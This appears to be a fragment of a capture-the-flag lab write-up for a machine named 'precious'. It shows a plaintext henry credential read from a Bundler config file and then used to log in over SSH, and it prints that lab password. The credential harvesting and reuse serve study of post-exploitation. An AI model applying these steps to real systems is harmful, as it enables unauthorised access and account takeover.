# Reverse Shell Ruby Enumeration

Found what looks like creds for a henry user: 

```bash
ruby@precious:~$ ls -lah .bundle/
total 12K
dr-xr-xr-x 2 root ruby 4.0K Oct 26  2022 .
drwxr-xr-x 4 ruby ruby 4.0K Mar 23 00:31 ..
-r-xr-xr-x 1 root ruby   62 Sep 26  2022 config
ruby@precious:~$ cat .bundle/config
---
BUNDLE_HTTPS://RUBYGEMS__ORG/: "henry:Q3c1AqGHtoI0aXAYFH"
ruby@precious:~$
```

Tested and works as SSH with henry

```bash
└─$ ssh henry@10.129.228.98
The authenticity of host '10.129.228.98 (10.129.228.98)' can't be established.
ED25519 key fingerprint is: SHA256:1WpIxI8qwKmYSRdGtCjweUByFzcn0MSpKgv+AwWRLkU
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.228.98' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
henry@10.129.228.98's password:
Linux precious 5.10.0-19-amd64 #1 SMP Debian 5.10.149-2 (2022-10-21) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
henry@precious:~$
```

